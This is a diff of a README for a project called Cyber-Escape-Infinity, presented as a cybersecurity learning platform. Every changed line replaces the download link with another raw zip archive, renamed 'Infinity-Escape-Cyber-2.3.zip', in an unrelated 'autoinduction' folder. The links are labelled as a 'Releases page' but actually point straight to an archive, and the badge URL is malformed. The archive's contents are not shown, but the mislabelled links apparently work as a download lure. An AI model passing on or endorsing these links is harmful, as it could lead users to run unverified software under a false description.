@@ -7,10 +7,10 @@ Welcome to Cyber-Escape-Infinity, an infinite cybersecurity learning platform! H
 To get started with Cyber-Escape-Infinity, follow the instructions in this guide. You will learn how to download the software and start using it to improve your cybersecurity skills.
 
 ## 📥 Download Cyber-Escape-Infinity
-[![Download the latest release](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Cyber-Escape-Infinity_v3.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Cyber-Escape-Infinity_v3.3.zip)
+[![Download the latest release](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Infinity-Escape-Cyber-2.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Infinity-Escape-Cyber-2.3.zip)
 
 ### Download & Install
-To download Cyber-Escape-Infinity, visit this page to download the latest version: [View Releases](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Cyber-Escape-Infinity_v3.3.zip).
+To download Cyber-Escape-Infinity, visit this page to download the latest version: [View Releases](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Infinity-Escape-Cyber-2.3.zip).
 
 1. Click on the link above to open the Releases page.
 2. From the list, find the version you want to download.
@@ -70,4 +70,4 @@ Enhance your learning with these additional resources:
 - **Tutorial Videos:** Watch our tutorial videos to understand how to use the platform effectively.
 - **Blog:** Read our blog for insights into the latest cybersecurity news and trends.
 
-Visit the Releases page to get started with your journey into cybersecurity: [Download Cyber-Escape-Infinity](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Cyber-Escape-Infinity_v3.3.zip). Enjoy learning and leveling up your skills!
+Visit the Releases page to get started with your journey into cybersecurity: [Download Cyber-Escape-Infinity](https://raw.githubusercontent.com/claudioibarrola/Cyber-Escape-Infinity/main/autoinduction/Infinity-Escape-Cyber-2.3.zip). Enjoy learning and leveling up your skills!
